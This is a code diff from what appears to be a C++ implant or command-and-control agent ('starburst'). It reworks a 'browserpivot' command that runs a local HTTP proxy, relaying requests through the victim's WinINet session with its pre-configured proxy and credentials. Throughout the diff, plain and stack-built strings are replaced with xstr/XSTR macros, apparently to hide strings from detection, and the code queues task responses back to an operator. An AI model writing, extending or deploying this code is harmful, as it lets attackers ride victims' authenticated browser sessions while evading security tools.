@@ -303,11 +303,7 @@ static auto WINAPI declfn bp_proxy_thread(
         /* ---- check for CONNECT (HTTPS tunnelling) -------------- */
         if ( is_connect_method( req_buf, total_read ) ) {
             /* V1: HTTPS CONNECT not supported - respond 501 */
-            char not_impl[] = {
-                'H','T','T','P','/','1','.','1',' ',
-                '5','0','1',' ',
-                'N','o','t',' ','I','m','p','l','e','m','e','n','t','e','d',
-                '\r','\n','\r','\n', 0 };
+            xstr(not_impl, "HTTP/1.1 501 Not Implemented\r\n\r\n");
             bp_send_all( state, client, not_impl, 33 );
             inst.heap_free( req_buf );
             state->ws.pclosesocket( client );
@@ -319,11 +315,7 @@ static auto WINAPI declfn bp_proxy_thread(
         char* url_ptr = parse_http_url( req_buf, hdr_end, &url_len );
 
         if ( !url_ptr || url_len == 0 ) {
-            char bad_req[] = {
-                'H','T','T','P','/','1','.','1',' ',
-                '4','0','0',' ',
-                'B','a','d',' ','R','e','q','u','e','s','t',
-                '\r','\n','\r','\n', 0 };
+            xstr(bad_req, "HTTP/1.1 400 Bad Request\r\n\r\n");
             bp_send_all( state, client, bad_req, 28 );
             inst.heap_free( req_buf );
             state->ws.pclosesocket( client );
@@ -367,11 +359,7 @@ static auto WINAPI declfn bp_proxy_thread(
 
         if ( !h_url ) {
             /* WinINet could not open the URL - 502 Bad Gateway */
-            char bad_gw[] = {
-                'H','T','T','P','/','1','.','1',' ',
-                '5','0','2',' ',
-                'B','a','d',' ','G','a','t','e','w','a','y',
-                '\r','\n','\r','\n', 0 };
+            xstr(bad_gw, "HTTP/1.1 502 Bad Gateway\r\n\r\n");
             bp_send_all( state, client, bad_gw, 28 );
             inst.heap_free( req_buf );
             state->ws.pclosesocket( client );
@@ -416,10 +404,7 @@ static auto WINAPI declfn bp_proxy_thread(
             bp_send_all( state, client, crlf, 2 );
         } else {
             /* fallback: minimal 200 response */
-            char min_rsp[] = {
-                'H','T','T','P','/','1','.','1',' ',
-                '2','0','0',' ','O','K',
-                '\r','\n','\r','\n', 0 };
+            xstr(min_rsp, "HTTP/1.1 200 OK\r\n\r\n");
             bp_send_all( state, client, min_rsp, 19 );
         }
 
@@ -491,8 +476,7 @@ auto declfn starburst::bp_init(
 
     /* open a global WinINet session with pre-configured proxy/auth */
     state->h_internet = state->inet.pInternetOpenA(
-        symbol<const char*>( const_cast<char*>(
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" ) ),
+        XSTR( "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" ),
         BP_INTERNET_OPEN_TYPE_PRECONFIG,
         nullptr, nullptr, 0 );
 
@@ -592,7 +576,7 @@ auto declfn starburst::bp_destroy(
         lo.sin_family = static_cast<int16_t>( BP_AF_INET );
         lo.sin_port   = state->ws.phtons( state->port );
         lo.sin_addr   = state->ws.pinet_addr(
-            symbol<const char*>( const_cast<char*>( "127.0.0.1" ) ) );
+            XSTR( "127.0.0.1" ) );
 
         state->ws.pconnect( wake_sock,
             reinterpret_cast<const void*>( &lo ), sizeof( lo ) );
@@ -635,11 +619,11 @@ auto declfn starburst::cmd_browserpivot(
 
     if ( !action || action_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "missing action parameter" ) ) );
+            XSTR( "missing action parameter" ) );
         return;
     }
 
-    char start_str[] = { 's', 't', 'a', 'r', 't', 0 };
+    xstr(start_str, "start");
     char stop_str[]  = { 's', 't', 'o', 'p', 0 };
 
     if ( str_ncmp( action, start_str, 5 ) == 0 ) {
@@ -647,8 +631,7 @@ auto declfn starburst::cmd_browserpivot(
         /* --- START ----------------------------------------------- */
         if ( inst.browserpivot_state ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>(
-                    "browser pivot already running" ) ) );
+                XSTR("browser pivot already running") );
             return;
         }
 
@@ -656,15 +639,13 @@ auto declfn starburst::cmd_browserpivot(
         uint32_t port_val = parser_int32( params );
         if ( port_val == 0 || port_val > 65535 ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>(
-                    "invalid port number" ) ) );
+                XSTR("invalid port number") );
             return;
         }
 
         if ( !bp_init( inst, static_cast<uint16_t>( port_val ) ) ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>(
-                    "browser pivot init failed" ) ) );
+                XSTR("browser pivot init failed") );
             return;
         }
 
@@ -672,12 +653,7 @@ auto declfn starburst::cmd_browserpivot(
         char msg_buf[64];
         mem_set( msg_buf, 0, sizeof( msg_buf ) );
 
-        char prefix[] = {
-            'b','r','o','w','s','e','r',' ',
-            'p','i','v','o','t',' ',
-            's','t','a','r','t','e','d',' ',
-            'o','n',' ',
-            'p','o','r','t',' ', 0 };
+        xstr(prefix, "browser pivot started on port ");
 
         str_copy( msg_buf, prefix );
 
@@ -693,21 +669,18 @@ auto declfn starburst::cmd_browserpivot(
         /* --- STOP ------------------------------------------------ */
         if ( !inst.browserpivot_state ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>(
-                    "browser pivot not running" ) ) );
+                XSTR("browser pivot not running") );
             return;
         }
 
         bp_destroy( inst );
 
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>(
-                "browser pivot stopped" ) ) );
+            XSTR("browser pivot stopped") );
 
     } else {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>(
-                "unknown action: use start or stop" ) ) );
+            XSTR("unknown action: use start or stop") );
     }
 }
 
